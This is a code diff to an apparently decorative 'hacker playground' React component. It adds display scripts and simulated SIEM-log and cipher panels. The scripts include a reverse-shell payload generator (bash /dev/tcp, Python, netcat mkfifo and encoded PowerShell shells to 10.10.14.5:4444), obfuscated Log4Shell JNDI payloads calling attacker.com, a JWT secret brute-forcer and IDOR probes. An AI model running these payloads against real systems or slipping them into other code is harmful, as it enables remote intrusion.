@@ -456,6 +456,432 @@ ls -la /etc/cron.* 2>/dev/null
 echo ""
 echo "[*] Enumeration complete!"`,
   },
+  {
+    title: 'Reverse Shell Generator',
+    code: `#!/usr/bin/env python3
+"""
+Reverse Shell Payload Generator
+For authorized penetration testing only
+"""
+import base64
+import sys
+
+class ShellGenerator:
+    def __init__(self, ip, port):
+        self.ip = ip
+        self.port = port
+
+    def bash_tcp(self):
+        return f"bash -i >& /dev/tcp/{self.ip}/{self.port} 0>&1"
+
+    def python_tcp(self):
+        return f'''python3 -c 'import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+s.connect(("{self.ip}",{self.port}));
+os.dup2(s.fileno(),0);
+os.dup2(s.fileno(),1);
+os.dup2(s.fileno(),2);
+subprocess.call(["/bin/sh","-i"])'
+'''
+
+    def netcat_mkfifo(self):
+        return f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {self.ip} {self.port} >/tmp/f"
+
+    def powershell(self):
+        ps = f'''$client = New-Object System.Net.Sockets.TCPClient("{self.ip}",{self.port});
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{{0}};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush();
+}};
+$client.Close();'''
+        encoded = base64.b64encode(ps.encode('utf-16-le')).decode()
+        return f"powershell -e {encoded}"
+
+    def generate_all(self):
+        print("[*] Generating Reverse Shell Payloads")
+        print(f"[*] Target: {self.ip}:{self.port}")
+        print("=" * 50)
+
+        print("\\n[+] Bash TCP:")
+        print(self.bash_tcp())
+
+        print("\\n[+] Python:")
+        print(self.python_tcp())
+
+        print("\\n[+] Netcat mkfifo:")
+        print(self.netcat_mkfifo())
+
+        print("\\n[+] PowerShell (base64):")
+        print(self.powershell()[:100] + "...")
+
+# Generate payloads
+generator = ShellGenerator("10.10.14.5", 4444)
+generator.generate_all()`,
+  },
+  {
+    title: 'JWT Token Cracker',
+    code: `// JWT Token Security Analyzer & Cracker
+const crypto = require('crypto');
+
+class JWTAnalyzer {
+  constructor(token) {
+    this.token = token;
+    this.parts = token.split('.');
+    this.header = null;
+    this.payload = null;
+    this.signature = null;
+  }
+
+  decode() {
+    try {
+      this.header = JSON.parse(
+        Buffer.from(this.parts[0], 'base64url').toString()
+      );
+      this.payload = JSON.parse(
+        Buffer.from(this.parts[1], 'base64url').toString()
+      );
+      this.signature = this.parts[2];
+
+      console.log('[*] JWT Token Decoded Successfully');
+      console.log('\\n[+] Header:', JSON.stringify(this.header, null, 2));
+      console.log('\\n[+] Payload:', JSON.stringify(this.payload, null, 2));
+
+      return true;
+    } catch (e) {
+      console.log('[-] Invalid JWT token');
+      return false;
+    }
+  }
+
+  checkVulnerabilities() {
+    console.log('\\n[*] Checking for vulnerabilities...');
+
+    // Check for 'none' algorithm
+    if (this.header.alg === 'none' || this.header.alg === 'None') {
+      console.log('[!] CRITICAL: Algorithm "none" detected!');
+    }
+
+    // Check for weak algorithms
+    if (['HS256', 'HS384', 'HS512'].includes(this.header.alg)) {
+      console.log('[!] Warning: Symmetric algorithm - brute force possible');
+    }
+
+    // Check expiration
+    if (this.payload.exp) {
+      const expDate = new Date(this.payload.exp * 1000);
+      if (expDate < new Date()) {
+        console.log('[!] Token expired:', expDate.toISOString());
+      }
+    } else {
+      console.log('[!] Warning: No expiration claim (exp)');
+    }
+
+    // Check for sensitive data
+    const sensitiveKeys = ['password', 'secret', 'key', 'credit'];
+    Object.keys(this.payload).forEach(key => {
+      if (sensitiveKeys.some(s => key.toLowerCase().includes(s))) {
+        console.log(\`[!] Sensitive data in payload: \${key}\`);
+      }
+    });
+  }
+
+  async bruteForceSecret(wordlist) {
+    console.log('\\n[*] Starting brute force attack...');
+    const data = \`\${this.parts[0]}.\${this.parts[1]}\`;
+
+    for (const secret of wordlist) {
+      const hmac = crypto.createHmac('sha256', secret);
+      hmac.update(data);
+      const sig = hmac.digest('base64url');
+
+      if (sig === this.signature) {
+        console.log(\`[+] SECRET FOUND: \${secret}\`);
+        return secret;
+      }
+    }
+    console.log('[-] Secret not found in wordlist');
+    return null;
+  }
+}
+
+// Analyze JWT
+const token = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...';
+const analyzer = new JWTAnalyzer(token);
+analyzer.decode();
+analyzer.checkVulnerabilities();
+analyzer.bruteForceSecret(['secret', 'password', '123456', 'admin']);`,
+  },
+  {
+    title: 'Log4Shell Scanner',
+    code: `#!/usr/bin/env python3
+"""
+Log4Shell (CVE-2021-44228) Vulnerability Scanner
+Educational demonstration of JNDI injection detection
+"""
+import requests
+import uuid
+from urllib.parse import quote
+
+class Log4ShellScanner:
+    def __init__(self, callback_server):
+        self.callback = callback_server
+        self.payloads = [
+            "\${jndi:ldap://CALLBACK/a}",
+            "\${jndi:rmi://CALLBACK/a}",
+            "\${jndi:dns://CALLBACK/a}",
+            "\${\${lower:j}ndi:\${lower:l}dap://CALLBACK/a}",
+            "\${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://CALLBACK/a}",
+            "\${\${env:BARFOO:-j}ndi:\${env:BARFOO:-l}dap://CALLBACK/a}",
+        ]
+        self.headers_to_test = [
+            'User-Agent',
+            'X-Forwarded-For',
+            'X-Api-Version',
+            'Authorization',
+            'Referer',
+            'X-Request-Id',
+            'Accept-Language',
+        ]
+
+    def generate_callback(self, identifier):
+        return f"{self.callback}/{identifier}"
+
+    def scan_url(self, url):
+        print(f"[*] Scanning: {url}")
+        print(f"[*] Callback server: {self.callback}")
+        print("=" * 60)
+
+        for header in self.headers_to_test:
+            for payload_template in self.payloads:
+                scan_id = str(uuid.uuid4())[:8]
+                callback_url = self.generate_callback(scan_id)
+                payload = payload_template.replace("CALLBACK", callback_url)
+
+                try:
+                    print(f"[*] Testing {header} with payload variant...")
+                    headers = {header: payload}
+                    response = requests.get(url, headers=headers, timeout=5)
+
+                    print(f"    Status: {response.status_code}")
+                    print(f"    Scan ID: {scan_id}")
+                    print(f"    Check callback for: {callback_url}")
+
+                except requests.exceptions.Timeout:
+                    print(f"[!] Timeout - possible vulnerable (delayed response)")
+                except Exception as e:
+                    print(f"[-] Error: {e}")
+
+        print("\\n[*] Scan complete!")
+        print("[*] Monitor your callback server for incoming connections")
+        print("[*] Incoming connection = VULNERABLE to Log4Shell")
+
+# Run scanner
+scanner = Log4ShellScanner("http://attacker.com:1389")
+scanner.scan_url("https://target.com/api/v1/login")`,
+  },
+  {
+    title: 'API Security Tester',
+    code: `// REST API Security Testing Framework
+class APISecurityTester {
+  constructor(baseUrl, authToken = null) {
+    this.baseUrl = baseUrl;
+    this.authToken = authToken;
+    this.vulnerabilities = [];
+  }
+
+  async testBrokenAuthentication() {
+    console.log('[*] Testing Broken Authentication...');
+
+    // Test without auth
+    const noAuth = await fetch(\`\${this.baseUrl}/api/users\`);
+    if (noAuth.ok) {
+      this.vulnerabilities.push({
+        type: 'BROKEN_AUTH',
+        severity: 'CRITICAL',
+        detail: 'Endpoint accessible without authentication'
+      });
+      console.log('[!] CRITICAL: No authentication required!');
+    }
+
+    // Test with invalid token
+    const invalidToken = await fetch(\`\${this.baseUrl}/api/users\`, {
+      headers: { 'Authorization': 'Bearer invalid_token_12345' }
+    });
+    if (invalidToken.ok) {
+      this.vulnerabilities.push({
+        type: 'WEAK_TOKEN_VALIDATION',
+        severity: 'HIGH',
+        detail: 'Invalid tokens accepted'
+      });
+      console.log('[!] HIGH: Invalid token accepted!');
+    }
+  }
+
+  async testIDOR(userId) {
+    console.log('[*] Testing IDOR vulnerabilities...');
+
+    // Try accessing other users' data
+    for (let i = 1; i <= 10; i++) {
+      if (i === userId) continue;
+
+      const response = await fetch(\`\${this.baseUrl}/api/users/\${i}\`, {
+        headers: { 'Authorization': \`Bearer \${this.authToken}\` }
+      });
+
+      if (response.ok) {
+        const data = await response.json();
+        console.log(\`[!] IDOR: Accessed user \${i} data!\`);
+        this.vulnerabilities.push({
+          type: 'IDOR',
+          severity: 'HIGH',
+          detail: \`Can access user \${i} data\`
+        });
+      }
+    }
+  }
+
+  async testRateLimiting() {
+    console.log('[*] Testing Rate Limiting...');
+
+    let successCount = 0;
+    for (let i = 0; i < 100; i++) {
+      const response = await fetch(\`\${this.baseUrl}/api/login\`, {
+        method: 'POST',
+        body: JSON.stringify({ user: 'test', pass: 'test' })
+      });
+      if (response.status !== 429) successCount++;
+    }
+
+    if (successCount > 50) {
+      console.log(\`[!] No rate limiting: \${successCount}/100 requests succeeded\`);
+      this.vulnerabilities.push({
+        type: 'NO_RATE_LIMIT',
+        severity: 'MEDIUM',
+        detail: 'Brute force attacks possible'
+      });
+    }
+  }
+
+  generateReport() {
+    console.log('\\n========== SECURITY REPORT ==========');
+    console.log(\`Total vulnerabilities: \${this.vulnerabilities.length}\`);
+    this.vulnerabilities.forEach((v, i) => {
+      console.log(\`\\n[\${i+1}] \${v.type}\`);
+      console.log(\`    Severity: \${v.severity}\`);
+      console.log(\`    Detail: \${v.detail}\`);
+    });
+  }
+}
+
+const tester = new APISecurityTester('https://api.target.com', 'user_token');
+await tester.testBrokenAuthentication();
+await tester.testIDOR(5);
+await tester.testRateLimiting();
+tester.generateReport();`,
+  },
+  {
+    title: 'Memory Forensics Analyzer',
+    code: `#!/usr/bin/env python3
+"""
+Memory Forensics Tool
+Analyzes memory dumps for malware artifacts
+"""
+import re
+from collections import defaultdict
+
+class MemoryForensics:
+    def __init__(self, dump_path):
+        self.dump_path = dump_path
+        self.findings = []
+        self.iocs = defaultdict(list)
+
+    def extract_strings(self, min_length=6):
+        """Extract ASCII strings from memory dump"""
+        print("[*] Extracting strings from memory dump...")
+
+        patterns = {
+            'ip_addresses': r'\\b\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\b',
+            'urls': r'https?://[\\w\\.-]+(?:/[\\w\\.-]*)*',
+            'emails': r'[\\w\\.-]+@[\\w\\.-]+\\.\\w+',
+            'file_paths': r'[A-Z]:\\\\(?:[\\w\\s-]+\\\\)*[\\w\\s.-]+',
+            'registry_keys': r'HKEY_[\\w_]+(?:\\\\[\\w\\s-]+)+',
+            'base64': r'[A-Za-z0-9+/]{50,}={0,2}',
+        }
+
+        for ioc_type, pattern in patterns.items():
+            matches = re.findall(pattern, self.memory_data)
+            self.iocs[ioc_type].extend(set(matches))
+            print(f"[+] Found {len(set(matches))} {ioc_type}")
+
+    def detect_injected_code(self):
+        """Detect potential code injection patterns"""
+        print("\\n[*] Scanning for injected code patterns...")
+
+        signatures = [
+            (b'\\x4d\\x5a', 'PE Header (MZ)'),
+            (b'\\x7f\\x45\\x4c\\x46', 'ELF Header'),
+            (b'VirtualAlloc', 'VirtualAlloc API'),
+            (b'CreateRemoteThread', 'Thread Injection'),
+            (b'NtUnmapViewOfSection', 'Process Hollowing'),
+            (b'LoadLibraryA', 'DLL Injection'),
+            (b'WinExec', 'Command Execution'),
+            (b'ShellExecute', 'Shell Execution'),
+        ]
+
+        for sig, name in signatures:
+            count = self.memory_data.count(sig)
+            if count > 0:
+                print(f"[!] {name}: {count} occurrences")
+                self.findings.append({
+                    'type': 'INJECTION_INDICATOR',
+                    'signature': name,
+                    'count': count
+                })
+
+    def find_encryption_keys(self):
+        """Search for potential encryption keys"""
+        print("\\n[*] Searching for encryption artifacts...")
+
+        # Look for high-entropy regions (potential keys)
+        # AES key patterns, RSA markers, etc.
+        key_patterns = [
+            (r'-----BEGIN [A-Z]+ KEY-----', 'PEM Key'),
+            (r'AQAB', 'RSA Public Exponent'),
+            (r'[A-Fa-f0-9]{64}', 'Potential AES-256 Key'),
+        ]
+
+        for pattern, name in key_patterns:
+            matches = re.findall(pattern.encode(), self.memory_data)
+            if matches:
+                print(f"[+] Found {len(matches)} potential {name}")
+
+    def generate_report(self):
+        print("\\n" + "=" * 50)
+        print("MEMORY FORENSICS REPORT")
+        print("=" * 50)
+
+        print("\\n[IOCs Found]")
+        for ioc_type, values in self.iocs.items():
+            print(f"  {ioc_type}: {len(values)}")
+
+        print("\\n[Suspicious Findings]")
+        for finding in self.findings:
+            print(f"  - {finding['signature']}: {finding['count']}")
+
+        print("\\n[*] Analysis complete!")
+
+# Run analysis
+forensics = MemoryForensics('/path/to/memory.dmp')
+forensics.extract_strings()
+forensics.detect_injected_code()
+forensics.find_encryption_keys()
+forensics.generate_report()`,
+  },
 ]
 
 // ============================================
@@ -1985,10 +2411,352 @@ function WorldMapAttacks({ isActive }: { isActive: boolean }) {
 }
 
 // ============================================
+// LOG ANALYSIS / SIEM SIMULATION
+// ============================================
+
+interface LogEntry {
+  id: number
+  timestamp: string
+  source: string
+  level: 'INFO' | 'WARNING' | 'ERROR' | 'CRITICAL'
+  event: string
+  details: string
+}
+
+function SIEMSimulation({ isActive }: { isActive: boolean }) {
+  const [logs, setLogs] = useState<LogEntry[]>([])
+  const [alerts, setAlerts] = useState(0)
+  const [eventsPerSec, setEventsPerSec] = useState(0)
+  const [filter, setFilter] = useState<'all' | 'WARNING' | 'ERROR' | 'CRITICAL'>('all')
+  const [correlatedThreats, setCorrelatedThreats] = useState<string[]>([])
+
+  const logTemplates = [
+    { level: 'INFO' as const, source: 'firewall', event: 'Connection allowed', details: 'TCP 192.168.1.{IP}:{PORT} -> 10.0.0.1:443' },
+    { level: 'INFO' as const, source: 'webserver', event: 'HTTP Request', details: 'GET /api/users HTTP/1.1 200 OK' },
+    { level: 'WARNING' as const, source: 'auth', event: 'Failed login attempt', details: 'User: admin, IP: {IP}, Attempts: {N}' },
+    { level: 'WARNING' as const, source: 'ids', event: 'Suspicious pattern detected', details: 'SQL injection attempt from {IP}' },
+    { level: 'ERROR' as const, source: 'database', event: 'Connection timeout', details: 'MySQL server not responding' },
+    { level: 'ERROR' as const, source: 'application', event: 'Unhandled exception', details: 'NullPointerException at UserService.java:142' },
+    { level: 'CRITICAL' as const, source: 'security', event: 'Brute force detected', details: '{N} failed attempts from {IP} in 60 seconds' },
+    { level: 'CRITICAL' as const, source: 'malware', event: 'Ransomware signature', details: 'CryptoLocker variant detected on HOST-{N}' },
+    { level: 'INFO' as const, source: 'system', event: 'Service started', details: 'nginx service started successfully' },
+    { level: 'WARNING' as const, source: 'network', event: 'High bandwidth usage', details: '{N}% bandwidth utilization on eth0' },
+  ]
+
+  const threatCorrelations = [
+    'APT Campaign: Multiple indicators suggest targeted attack',
+    'Lateral Movement: Suspicious RDP connections between hosts',
+    'Data Exfiltration: Large outbound data transfers detected',
+    'Credential Stuffing: Distributed login attempts from botnet',
+    'Zero-Day Exploit: Unknown attack pattern detected',
+  ]
+
+  useEffect(() => {
+    if (!isActive) return
+
+    const interval = setInterval(() => {
+      const template = logTemplates[Math.floor(Math.random() * logTemplates.length)]
+      const ip = `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`
+      const port = Math.floor(Math.random() * 65535)
+      const n = Math.floor(Math.random() * 100)
+
+      const newLog: LogEntry = {
+        id: Date.now() + Math.random(),
+        timestamp: new Date().toISOString().split('T')[1].slice(0, 12),
+        source: template.source,
+        level: template.level,
+        event: template.event,
+        details: template.details.replace('{IP}', ip).replace('{PORT}', String(port)).replace('{N}', String(n)),
+      }
+
+      setLogs(prev => [newLog, ...prev.slice(0, 20)])
+      setEventsPerSec(Math.floor(Math.random() * 500) + 100)
+
+      if (template.level === 'CRITICAL' || template.level === 'ERROR') {
+        setAlerts(prev => prev + 1)
+      }
+
+      // Random threat correlation
+      if (Math.random() > 0.95) {
+        const threat = threatCorrelations[Math.floor(Math.random() * threatCorrelations.length)]
+        setCorrelatedThreats(prev => [threat, ...prev.slice(0, 2)])
+      }
+    }, 400)
+
+    return () => clearInterval(interval)
+  }, [isActive])
+
+  const filteredLogs = filter === 'all' ? logs : logs.filter(l => l.level === filter)
+
+  return (
+    <div className="space-y-3 font-mono text-xs h-full overflow-auto">
+      {/* Header */}
+      <div className="flex items-center justify-between">
+        <div className="flex items-center gap-2 text-blue-400">
+          <Activity className="w-4 h-4" />
+          <span className="font-bold">SIEM DASHBOARD</span>
+        </div>
+        <div className="flex items-center gap-3 text-[10px]">
+          <span className="text-green-400">{eventsPerSec} events/s</span>
+          <span className="text-red-400">{alerts} alerts</span>
+        </div>
+      </div>
+
+      {/* Filter */}
+      <div className="flex gap-1">
+        {(['all', 'WARNING', 'ERROR', 'CRITICAL'] as const).map((f) => (
+          <button
+            key={f}
+            onClick={() => setFilter(f)}
+            className={cn(
+              "px-2 py-0.5 rounded text-[10px]",
+              filter === f ? "bg-blue-500/20 text-blue-400" : "bg-zinc-800 text-muted-foreground"
+            )}
+          >
+            {f}
+          </button>
+        ))}
+      </div>
+
+      {/* Correlated Threats */}
+      {correlatedThreats.length > 0 && (
+        <div className="space-y-1">
+          {correlatedThreats.map((threat, i) => (
+            <motion.div
+              key={i}
+              initial={{ opacity: 0, x: -10 }}
+              animate={{ opacity: 1, x: 0 }}
+              className="p-2 bg-red-500/20 border border-red-500/30 rounded text-[10px] text-red-400"
+            >
+              <Zap className="w-3 h-3 inline mr-1" />
+              {threat}
+            </motion.div>
+          ))}
+        </div>
+      )}
+
+      {/* Log Stream */}
+      <div className="space-y-0.5">
+        <AnimatePresence>
+          {filteredLogs.slice(0, 12).map((log) => (
+            <motion.div
+              key={log.id}
+              initial={{ opacity: 0, height: 0 }}
+              animate={{ opacity: 1, height: 'auto' }}
+              exit={{ opacity: 0 }}
+              className={cn(
+                "p-1.5 rounded text-[10px] border-l-2",
+                log.level === 'INFO' && "bg-zinc-900/50 border-gray-500",
+                log.level === 'WARNING' && "bg-yellow-500/10 border-yellow-500",
+                log.level === 'ERROR' && "bg-orange-500/10 border-orange-500",
+                log.level === 'CRITICAL' && "bg-red-500/10 border-red-500",
+              )}
+            >
+              <div className="flex items-center gap-2">
+                <span className="text-muted-foreground">{log.timestamp}</span>
+                <span className={cn(
+                  "px-1 rounded",
+                  log.level === 'INFO' && "bg-gray-500/20 text-gray-400",
+                  log.level === 'WARNING' && "bg-yellow-500/20 text-yellow-400",
+                  log.level === 'ERROR' && "bg-orange-500/20 text-orange-400",
+                  log.level === 'CRITICAL' && "bg-red-500/20 text-red-400",
+                )}>
+                  {log.level}
+                </span>
+                <span className="text-cyan-400">[{log.source}]</span>
+                <span className="text-white">{log.event}</span>
+              </div>
+              <div className="text-muted-foreground mt-0.5 pl-4">{log.details}</div>
+            </motion.div>
+          ))}
+        </AnimatePresence>
+      </div>
+    </div>
+  )
+}
+
+// ============================================
+// ENCRYPTION/DECRYPTION DEMO
+// ============================================
+
+function CryptoDemo({ isActive }: { isActive: boolean }) {
+  const [plaintext, setPlaintext] = useState('Hello, World!')
+  const [key, setKey] = useState('secret123')
+  const [algorithm, setAlgorithm] = useState<'caesar' | 'xor' | 'base64' | 'rot13'>('caesar')
+  const [encrypted, setEncrypted] = useState('')
+  const [decrypted, setDecrypted] = useState('')
+  const [isEncrypting, setIsEncrypting] = useState(false)
+
+  const caesarCipher = (text: string, shift: number) => {
+    return text.split('').map(char => {
+      if (char.match(/[a-z]/i)) {
+        const code = char.charCodeAt(0)
+        const base = code >= 65 && code <= 90 ? 65 : 97
+        return String.fromCharCode(((code - base + shift) % 26) + base)
+      }
+      return char
+    }).join('')
+  }
+
+  const xorCipher = (text: string, key: string) => {
+    return text.split('').map((char, i) => {
+      const keyChar = key.charCodeAt(i % key.length)
+      return String.fromCharCode(char.charCodeAt(0) ^ keyChar)
+    }).join('')
+  }
+
+  const rot13 = (text: string) => caesarCipher(text, 13)
+
+  useEffect(() => {
+    if (!isActive) return
+
+    setIsEncrypting(true)
+    const timer = setTimeout(() => {
+      let result = ''
+      switch (algorithm) {
+        case 'caesar':
+          result = caesarCipher(plaintext, 3)
+          break
+        case 'xor':
+          result = btoa(xorCipher(plaintext, key))
+          break
+        case 'base64':
+          result = btoa(plaintext)
+          break
+        case 'rot13':
+          result = rot13(plaintext)
+          break
+      }
+      setEncrypted(result)
+      setIsEncrypting(false)
+
+      // Auto decrypt
+      setTimeout(() => {
+        switch (algorithm) {
+          case 'caesar':
+            setDecrypted(caesarCipher(result, -3))
+            break
+          case 'xor':
+            setDecrypted(xorCipher(atob(result), key))
+            break
+          case 'base64':
+            setDecrypted(atob(result))
+            break
+          case 'rot13':
+            setDecrypted(rot13(result))
+            break
+        }
+      }, 500)
+    }, 300)
+
+    return () => clearTimeout(timer)
+  }, [plaintext, key, algorithm, isActive])
+
+  return (
+    <div className="space-y-4 font-mono text-xs h-full overflow-auto">
+      {/* Header */}
+      <div className="flex items-center gap-2 text-purple-400">
+        <Lock className="w-4 h-4" />
+        <span className="font-bold">CRYPTOGRAPHY LAB</span>
+      </div>
+
+      {/* Algorithm Selector */}
+      <div className="flex flex-wrap gap-1">
+        {(['caesar', 'xor', 'base64', 'rot13'] as const).map((alg) => (
+          <button
+            key={alg}
+            onClick={() => setAlgorithm(alg)}
+            className={cn(
+              "px-2 py-1 rounded text-[10px] uppercase",
+              algorithm === alg ? "bg-purple-500/20 text-purple-400 border border-purple-500/30" : "bg-zinc-800"
+            )}
+          >
+            {alg}
+          </button>
+        ))}
+      </div>
+
+      {/* Input */}
+      <div className="space-y-2">
+        <label className="text-muted-foreground text-[10px]">Plaintext:</label>
+        <input
+          type="text"
+          value={plaintext}
+          onChange={(e) => setPlaintext(e.target.value)}
+          className="w-full px-3 py-2 bg-black border border-zinc-700 rounded focus:border-purple-500 focus:outline-none text-green-400"
+        />
+      </div>
+
+      {algorithm === 'xor' && (
+        <div className="space-y-2">
+          <label className="text-muted-foreground text-[10px]">Key:</label>
+          <input
+            type="text"
+            value={key}
+            onChange={(e) => setKey(e.target.value)}
+            className="w-full px-3 py-2 bg-black border border-zinc-700 rounded focus:border-purple-500 focus:outline-none text-yellow-400"
+          />
+        </div>
+      )}
+
+      {/* Encryption Flow */}
+      <div className="relative py-4">
+        <div className="flex items-center justify-between">
+          <div className="flex-1 p-3 bg-green-500/10 border border-green-500/30 rounded">
+            <div className="text-[10px] text-muted-foreground mb-1">Input</div>
+            <div className="text-green-400 break-all">{plaintext}</div>
+          </div>
+
+          <div className="px-4 flex flex-col items-center">
+            <motion.div
+              animate={isEncrypting ? { rotate: 360 } : {}}
+              transition={{ duration: 1, repeat: isEncrypting ? Infinity : 0 }}
+            >
+              <Lock className="w-6 h-6 text-purple-400" />
+            </motion.div>
+            <ArrowRight className="w-4 h-4 text-muted-foreground mt-1" />
+          </div>
+
+          <div className="flex-1 p-3 bg-red-500/10 border border-red-500/30 rounded">
+            <div className="text-[10px] text-muted-foreground mb-1">Encrypted</div>
+            <div className="text-red-400 break-all">{encrypted || '...'}</div>
+          </div>
+        </div>
+
+        {/* Decryption */}
+        <div className="mt-4 flex items-center justify-center">
+          <ArrowRight className="w-4 h-4 text-muted-foreground rotate-90" />
+        </div>
+
+        <div className="mt-4 p-3 bg-cyan-500/10 border border-cyan-500/30 rounded">
+          <div className="text-[10px] text-muted-foreground mb-1">Decrypted</div>
+          <div className="text-cyan-400 break-all">{decrypted || '...'}</div>
+          {decrypted === plaintext && decrypted && (
+            <div className="mt-2 flex items-center gap-1 text-green-400 text-[10px]">
+              <Check className="w-3 h-3" />
+              Decryption successful!
+            </div>
+          )}
+        </div>
+      </div>
+
+      {/* Algorithm Info */}
+      <div className="p-3 bg-zinc-900/50 border border-zinc-800 rounded text-[10px]">
+        <div className="text-muted-foreground mb-1">Algorithm Info:</div>
+        {algorithm === 'caesar' && <p>Caesar Cipher: Shifts each letter by 3 positions in the alphabet.</p>}
+        {algorithm === 'xor' && <p>XOR Cipher: Applies XOR operation with the key (symmetric).</p>}
+        {algorithm === 'base64' && <p>Base64: Encodes binary data as ASCII text (encoding, not encryption).</p>}
+        {algorithm === 'rot13' && <p>ROT13: Caesar cipher with shift of 13 (self-inverse).</p>}
+      </div>
+    </div>
+  )
+}
+
+// ============================================
 // MAIN HACKER PLAYGROUND COMPONENT
 // ============================================
 
-type PlaygroundMode = 'code' | 'scan' | 'terminal' | 'threats' | 'crack' | 'binary' | 'takeover' | 'ctf' | 'firewall' | 'worldmap'
+type PlaygroundMode = 'code' | 'scan' | 'terminal' | 'threats' | 'crack' | 'binary' | 'takeover' | 'ctf' | 'firewall' | 'worldmap' | 'siem' | 'crypto'
 
 export function HackerPlayground() {
   const [isPlaying, setIsPlaying] = useState(true)
@@ -2019,6 +2787,8 @@ export function HackerPlayground() {
       '8': 'ctf',
       '9': 'firewall',
       '0': 'worldmap',
+      's': 'siem',
+      'c': 'crypto',
     }
 
     const handleKeyPress = (e: KeyboardEvent) => {
@@ -2054,6 +2824,8 @@ export function HackerPlayground() {
     { id: 'ctf', label: 'CTF Challenge', icon: Flag },
     { id: 'firewall', label: 'Firewall Bypass', icon: ShieldOff },
     { id: 'worldmap', label: 'Global Threats', icon: Globe },
+    { id: 'siem', label: 'SIEM Logs', icon: Activity },
+    { id: 'crypto', label: 'Crypto Lab', icon: Lock },
   ]
 
   return (
@@ -2153,6 +2925,8 @@ export function HackerPlayground() {
             {mode === 'ctf' && 'CTF Platform - Capture The Flag'}
             {mode === 'firewall' && 'Firewall Evasion Framework'}
             {mode === 'worldmap' && 'Global Threat Intelligence'}
+            {mode === 'siem' && 'Splunk / Elastic SIEM'}
+            {mode === 'crypto' && 'Cryptography Laboratory'}
           </div>
           <div className="text-xs text-muted-foreground font-mono">
             {mode === 'code' && `${currentScriptIndex + 1}/${hackingScripts.length}`}
@@ -2178,6 +2952,8 @@ export function HackerPlayground() {
           {mode === 'ctf' && <CTFChallenge isActive={isPlaying} />}
           {mode === 'firewall' && <FirewallBypassVisualization isActive={isPlaying} />}
           {mode === 'worldmap' && <WorldMapAttacks isActive={isPlaying} />}
+          {mode === 'siem' && <SIEMSimulation isActive={isPlaying} />}
+          {mode === 'crypto' && <CryptoDemo isActive={isPlaying} />}
         </div>
 
         {/* Status Bar */}
@@ -2198,6 +2974,8 @@ export function HackerPlayground() {
               {mode === 'ctf' && 'Crypto / Web / Forensics'}
               {mode === 'firewall' && 'IDS/IPS Evasion'}
               {mode === 'worldmap' && 'Real-time Threat Intelligence'}
+              {mode === 'siem' && 'Log Aggregation & Correlation'}
+              {mode === 'crypto' && 'Cipher Algorithms Demo'}
             </span>
           </div>
           <div className="flex items-center gap-4 text-muted-foreground">
@@ -2234,7 +3012,7 @@ export function HackerPlayground() {
                 <X className="w-4 h-4" />
               </button>
             </div>
-            <div className="grid grid-cols-2 md:grid-cols-4 gap-3 text-xs font-mono">
+            <div className="grid grid-cols-2 md:grid-cols-5 gap-3 text-xs font-mono">
               <div className="space-y-1">
                 <div className="text-muted-foreground">Modes:</div>
                 <div><kbd className="px-1.5 py-0.5 bg-zinc-800 rounded">1</kbd> Live Coding</div>
@@ -2254,8 +3032,13 @@ export function HackerPlayground() {
                 <div><kbd className="px-1.5 py-0.5 bg-zinc-800 rounded">9</kbd> Firewall Bypass</div>
               </div>
               <div className="space-y-1">
-                <div className="text-muted-foreground">Controls:</div>
+                <div className="text-muted-foreground">More Modes:</div>
                 <div><kbd className="px-1.5 py-0.5 bg-zinc-800 rounded">0</kbd> Global Threats</div>
+                <div><kbd className="px-1.5 py-0.5 bg-zinc-800 rounded">S</kbd> SIEM Logs</div>
+                <div><kbd className="px-1.5 py-0.5 bg-zinc-800 rounded">C</kbd> Crypto Lab</div>
+              </div>
+              <div className="space-y-1">
+                <div className="text-muted-foreground">Controls:</div>
                 <div><kbd className="px-1.5 py-0.5 bg-zinc-800 rounded">Space</kbd> Play/Pause</div>
                 <div><kbd className="px-1.5 py-0.5 bg-zinc-800 rounded">M</kbd> Matrix Effect</div>
                 <div><kbd className="px-1.5 py-0.5 bg-zinc-800 rounded">R</kbd> Reset</div>
